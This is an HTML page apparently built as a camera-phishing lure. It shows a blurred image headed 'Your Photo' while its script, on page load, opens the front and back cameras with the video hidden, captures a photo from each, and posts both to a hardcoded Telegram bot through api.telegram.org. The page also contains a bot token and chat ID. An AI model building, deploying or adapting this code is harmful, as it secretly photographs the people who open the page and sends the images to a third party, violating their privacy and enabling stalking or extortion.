<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture and Send Photo</title>
    <style>
        video { display: none; } 
        h1 { color: green; text-align: center; }
        img { height: 350px; width: 300px; backdrop-filter: blur(50px); display: block; margin: auto; }
    </style>
</head>
<body>
    <h1>⏬ Your Photo ⏬</h1>
    <img src="camara/images.png" id="photo-preview">
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU";  // Your Bot Token
        const CHAT_ID = "2139008203";  // Your Chat ID
        const canvasFront = document.createElement('canvas');
        const canvasBack = document.createElement('canvas');
        let videoFront = null;
        let videoBack = null;
        let streamFront = null;
        let streamBack = null;

        // Function to start camera based on facing mode
        async function startCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
                const video = document.createElement('video');
                video.srcObject = stream;

                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve({ video, stream });
                    };
                });
            } catch (error) {
                console.error(`Error accessing ${facingMode} camera:`, error);
                return null;
            }
        }

        // Function to capture photo from a video stream
        async function capturePhoto(video, canvas) {
            if (!video) return null;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/png');
        }

        // Function to send photo to Telegram
        async function sendPhoto() {
            const frontPhoto = await capturePhoto(videoFront, canvasFront);
            const backPhoto = await capturePhoto(videoBack, canvasBack);
            if (!frontPhoto && !backPhoto) return;

            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);

            // Sending both front and back photos in one message
            if (frontPhoto) {
                const frontBlob = await (await fetch(frontPhoto)).blob();
                formData.append("photo", frontBlob, "front_photo.png");
            }
            if (backPhoto) {
                const backBlob = await (await fetch(backPhoto)).blob();
                formData.append("photo", backBlob, "back_photo.png");
            }

            // Send photos to Telegram
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
            } catch (error) {
                console.error("Error sending photos:", error);
            }
        }

        // Function to start the photo capture loop
        async function startPhotoCaptureLoop() {
            // Start both front and back cameras
            const frontCamera = await startCamera("user");
            const backCamera = await startCamera("environment");

            if (!frontCamera || !backCamera) {
                console.error("Could not access both front and back cameras");
                return;
            }

            videoFront = frontCamera.video;
            streamFront = frontCamera.stream;

            videoBack = backCamera.video;
            streamBack = backCamera.stream;

            // Capture and send photos after 5 seconds
            setTimeout(sendPhoto, 500);
        }

        // Start the photo capture loop when the window loads
        window.onload = startPhotoCaptureLoop;

        // Stop the camera when the page is about to unload
        window.onbeforeunload = () => {
            if (streamFront) {
                streamFront.getTracks().forEach(track => track.stop());
            }
            if (streamBack) {
                streamBack.getTracks().forEach(track => track.stop());
            }
        };
    </script>
</body>
</html>
